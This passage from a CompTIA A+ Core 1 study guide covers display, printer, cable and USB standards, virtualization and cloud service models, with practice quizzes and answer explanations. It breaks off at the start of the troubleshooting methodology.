- **Integrated graphics** — built into CPU. Good for office use, light tasks. No VRAM.
- **VRAM** — video RAM on the GPU. More = handles higher resolution textures.
- **Display outputs:** HDMI, DisplayPort, DVI, VGA (legacy).

### Cooling and power
- **Case fans** — intake (front/bottom) and exhaust (rear/top). Positive pressure = less dust.
- **Thermal management** — CPU cooler + thermal paste + case airflow.
- **UPS (Uninterruptible Power Supply)** — battery backup. Provides power during outages and clean shutdown time. Not a generator.
- **Surge protector** — protects from voltage spikes. Not a battery backup.

## 3.2 Display Technology

| Technology | Backlighting | Notes |
|---|---|---|
| IPS LCD | LED | Best color accuracy, wide viewing angles |
| TN LCD | LED | Fastest response time, gaming. Poor viewing angles |
| VA LCD | LED | High contrast, good for dark rooms |
| OLED | Self-lit pixels | True blacks, burn-in risk, thinner |

**Display specs:** Resolution (1080p/4K), refresh rate (Hz), response time (ms), panel type, HDR support, color gamut.

**Projector types:** LCD projector, DLP projector, Laser projector. Resolution, lumens (brightness), throw distance.

## 3.3 Printers

| Printer type | Technology | Use case | Pros | Cons |
|---|---|---|---|---|
| Laser | Toner + heat fusion | Office documents | Fast, cheap per page, crisp text | Expensive upfront, toner |
| Inkjet | Liquid ink sprayed | Photo printing, home | Color quality, low upfront | Slow, expensive ink |
| Thermal | Heat-reactive paper | Receipts, labels | Very quiet, no ink/toner | Paper fades, limited sizes |
| Impact/Dot Matrix | Ink ribbon + pins | Multi-part forms | Carbon copies | Loud, slow, low quality |

### Printer troubleshooting
- **Laser printer:** Toner smear = fuser issue. Lines/streaks = dirty drum or transfer corona. Ghost images = drum not cleaning. Paper jams = check feed rollers, media type.
- **Inkjet:** Color wrong = clogged nozzle (run cleaning). Streaks = low ink. Banding = nozzle alignment.
- **Thermal:** Blank output = paper loaded face-down or upside-down.

## 3.4 Cables and Connectors (Core 1 key topic)

### Video connectors
| Connector | Audio? | Notes |
|---|---|---|
| HDMI | Yes | Most common consumer standard. Up to 8K@60Hz (HDMI 2.1) |
| DisplayPort | Yes | PC monitor standard. High refresh rates. Daisy-chain |
| VGA | No | Legacy analog. Blue trapezoidal 15-pin |
| DVI | No (DVI-I has analog) | Digital + analog versions. Being phased out |
| USB-C/Thunderbolt | Yes | Modern laptops. Alt Mode carries DP signal |

### USB standards
| Standard | Speed | Notes |
|---|---|---|
| USB 2.0 | 480 Mbps | Black port |
| USB 3.0 / USB 3.2 Gen 1 | 5 Gbps | Blue port |
| USB 3.2 Gen 2 | 10 Gbps | Red or teal port |
| USB 3.2 Gen 2×2 | 20 Gbps | USB-C only |
| USB4 / Thunderbolt 4 | 40 Gbps | USB-C connector |

> **Exam Tip:** Blue USB port = USB 3.0 (5 Gbps). Black = USB 2.0. USB-A is the flat rectangle. USB-B is the square (printers). USB-C is the oval.

### Network cables
- **Cat 5e** — 1 Gbps up to 100m.
- **Cat 6** — 1 Gbps at 100m; 10 Gbps up to 55m.
- **Cat 6a** — 10 Gbps at 100m. Thicker, shielded.
- **Cat 7/8** — data center, very short runs, up to 25/40 Gbps.
- **Straight-through** — PC to switch. Pin 1→1, 2→2, etc.
- **Crossover** — same devices (PC to PC, switch to switch). Pins 1↔3, 2↔6.
- **Plenum-rated** — fire-resistant jacket for use in air ducts/ceiling spaces.

### Storage connectors
- **SATA** — 7-pin data, 15-pin power. Hot-swappable.
- **eSATA** — external SATA. Faster than USB 2.0, same speed as SATA.
- **M.2** — compact PCIe/SATA NVMe. Keyed: B-key (SATA), M-key (NVMe), B+M (both).
- **SAS** — enterprise serial attached SCSI. Faster, more reliable than SATA.

### Domain 3 Mini Quiz (8 questions)

**Q1.** A technician is replacing RAM in a laptop. What form factor should they use?
- A. DIMM  B. SO-DIMM  C. DDR4 UDIMM  D. ECC RDIMM

**Q2.** A desktop uses a 7200 RPM HDD. The user wants faster storage without changing the boot drive. The motherboard has an M.2 slot. What should be installed?
- A. SATA SSD in a drive bay  B. NVMe SSD in the M.2 slot  C. Second HDD  D. USB 3.0 external drive

**Q3.** A user prints a document and the toner smears when touched. Which printer component needs replacement?
- A. Drum unit  B. Transfer roller  C. Fuser assembly  D. Toner cartridge

**Q4.** Which USB port color indicates USB 3.0 (5 Gbps)?
- A. Black  B. Blue  C. Red  D. White

**Q5.** A monitor displays vertical colored lines. Which component is most likely failing?
- A. CPU  B. RAM  C. GPU or display cable  D. PSU

**Q6.** What is the purpose of a UPS in an office environment?
- A. Surge protection only  B. Battery backup providing time to safely shut down or continue during power outage  C. Voltage regulation only  D. Cooling the server

**Q7.** Which cable standard supports 10 Gbps for the full 100-meter run?
- A. Cat 5e  B. Cat 6  C. Cat 6a  D. Cat 7

**Q8.** An inkjet printer is producing banding (horizontal lines) in printouts. What is the MOST likely cause?
- A. Wrong paper type  B. Clogged print head nozzles requiring alignment/cleaning  C. Fuser failure  D. Low toner

### Domain 3 Answers
**Q1->B.** SO-DIMM = laptop RAM. DIMM = desktop.
**Q2->B.** NVMe M.2 = fastest storage upgrade available via M.2 slot.
**Q3->C.** Toner smears when touched = fuser (heats toner to bond to paper) is not fusing properly.
**Q4->B.** Blue = USB 3.0 (5 Gbps). Black = USB 2.0.
**Q5->C.** Vertical colored lines = GPU or cable issue (horizontal = LCD panel).
**Q6->B.** UPS = battery backup for safe shutdown during power outage. Not just surge protection.
**Q7->C.** Cat 6a = 10 Gbps at full 100m. Cat 6 only reaches 10 Gbps up to 55m.
**Q8->B.** Inkjet banding = clogged nozzles. Run head cleaning/alignment.

<div style="page-break-after: always;"></div>

# Core 1 — Domain 4: Virtualization and Cloud Computing (11%)

## 4.1 Virtualization

**Hypervisor** — software that creates and manages virtual machines.

**Type 1 (Bare-metal)** — runs directly on hardware, no host OS. More efficient. Examples: VMware ESXi, Microsoft Hyper-V (server), Xen, KVM.

**Type 2 (Hosted)** — runs on top of a host OS. Easier to use. Examples: VMware Workstation, VirtualBox, Parallels.

**VM (Virtual Machine)** — a software-based computer running on a hypervisor. Has its own virtual CPU, RAM, storage, and NICs.

**Container** — lightweight virtualization at the OS level. Shares the host OS kernel. Faster than VMs, less isolation. Docker = most common container runtime.

**Difference:** VMs = full OS per instance (heavyweight). Containers = shared OS kernel (lightweight). VMs have stronger isolation.

### VM concepts
- **Snapshot** — point-in-time state of a VM. Used for quick rollback before changes.
- **Template** — master VM image for rapid cloning.
- **Live migration** — move a running VM between physical hosts with zero downtime.
- **Resource allocation** — assign vCPU, RAM, disk, NIC to each VM.
- **Overprovisioning** — assign more resources than physically exist (works because VMs rarely use 100% at once).

### Network types in virtualization
- **NAT** — VM shares host IP. Internet access, not reachable from outside.
- **Bridged** — VM gets its own IP on the same network as the host. Fully visible to network.
- **Host-only** — VM can only communicate with the host. No internet.
- **Internal** — VMs communicate only with each other, not the host.

## 4.2 Cloud Computing

### Service models
**IaaS (Infrastructure as a Service)** — virtual machines, storage, networking. You manage: OS, apps, data. Example: AWS EC2, Azure VMs.
**PaaS (Platform as a Service)** — platform for app deployment. You manage: apps and data. Example: Heroku, AWS Elastic Beanstalk.
**SaaS (Software as a Service)** — fully managed software. You manage: data and user settings. Example: Gmail, Office 365, Salesforce.

### Deployment models
**Public cloud** — AWS, Azure, GCP. Shared infrastructure, pay-as-you-go.
**Private cloud** — dedicated infrastructure for one org. On-premises or hosted.
**Hybrid cloud** — mix of public + private. Data/apps move between them.
**Community cloud** — shared between organizations with similar needs (government, healthcare).

### Cloud characteristics (NIST definition)
1. **On-demand self-service** — provision without human interaction with provider.
2. **Broad network access** — access via any device over the network.
3. **Resource pooling** — shared infrastructure, multi-tenant.
4. **Rapid elasticity** — scale up/down quickly.
5. **Measured service** — pay for what you use.

### Cloud storage
- **File storage** — hierarchical folder structure (like a NAS). NFS, SMB.
- **Object storage** — flat namespace, data stored as objects with metadata. AWS S3, Azure Blob.
- **Block storage** — raw volumes attached to VMs (like a virtual hard drive). AWS EBS, Azure Disk.

### Domain 4 Mini Quiz (6 questions)

**Q1.** A company wants to run 50 VMs on a dedicated server with no host OS. Which hypervisor type?
- A. Type 2  B. Type 1  C. Container runtime  D. VDI

**Q2.** A developer wants their VM to get its own IP address visible on the corporate network. Which VM network mode?
- A. NAT  B. Host-only  C. Bridged  D. Internal

**Q3.** Which cloud model means the provider manages EVERYTHING including the application?
- A. IaaS  B. PaaS  C. SaaS  D. Hybrid

**Q4.** A company uses AWS for compute but keeps sensitive data in their own data center. What cloud model is this?
- A. Public  B. Private  C. Hybrid  D. Community

**Q5.** Which characteristic allows cloud resources to scale up immediately during peak demand and scale back down?
- A. Measured service  B. Rapid elasticity  C. Resource pooling  D. On-demand self-service

**Q6.** What is the PRIMARY advantage of containers over virtual machines?
- A. Stronger isolation  B. Fewer security vulnerabilities  C. Faster startup and lower resource overhead (shared OS kernel)  D. Better GUI support

### Domain 4 Answers
**Q1->B.** Type 1 = bare-metal, runs directly on hardware, no host OS.
**Q2->C.** Bridged = VM gets its own IP on the physical network.
**Q3->C.** SaaS = provider manages app, runtime, OS, hardware.
**Q4->C.** Public (AWS) + Private (own DC) = Hybrid cloud.
**Q5->B.** Rapid elasticity = scale quickly based on demand.
**Q6->C.** Containers share the host OS kernel = less overhead, faster start.

<div style="page-break-after: always;"></div>

# Core 1 — Domain 5: Hardware and Network Troubleshooting (29%)

## 5.1 Troubleshooting Methodology

CompTIA's official troubleshooting process (even though it's not directly tested as a checklist, understanding it helps):
1. **Identify the problem** — gather info, symptoms, recent changes, reproduce if possible.
2. **Research and establish theory** — consider what could cause the symptom (question the obvious first).
3. **Test the theory** — verify if your theory is correct. If not, establish a new theory.
4. **Establish a plan of action** — determine what needs to be done, consider side effects.
5. **Implement the solution** — fix it.
